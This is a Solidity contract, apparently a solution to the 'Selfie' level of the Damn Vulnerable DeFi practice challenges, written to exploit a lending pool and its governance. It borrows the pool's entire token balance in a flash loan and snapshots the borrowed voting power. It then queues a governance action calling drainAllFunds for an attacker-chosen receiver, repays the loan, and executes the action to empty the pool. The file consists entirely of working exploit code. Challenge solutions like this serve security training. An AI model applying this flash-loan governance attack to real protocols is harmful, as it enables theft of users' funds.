pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function snapshot() external returns (uint256);
}

contract SelfieAttacker {

    IPool private pool;
    IGovernance private governance;
    IToken private dvt;
    address private receiver;
    uint256 actionId;

    constructor(address poolAddress, address governanceAddress, address tokenAddress, address receiverAddress) {
        pool = IPool(poolAddress);
        dvt = IToken(tokenAddress);
        governance = IGovernance(governanceAddress);
        receiver = receiverAddress;
    }

    function receiveTokens(address tokenAddress, uint256 tokenAmount) external {
        dvt.snapshot();
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(
                "drainAllFunds(address)",
                receiver
            ), 0);
        dvt.transfer(address(pool), tokenAmount);
    }

    function prepare() external {
        pool.flashLoan(dvt.balanceOf(address(pool)));
    }

    function attack() external {
        governance.executeAction(actionId);
    }
}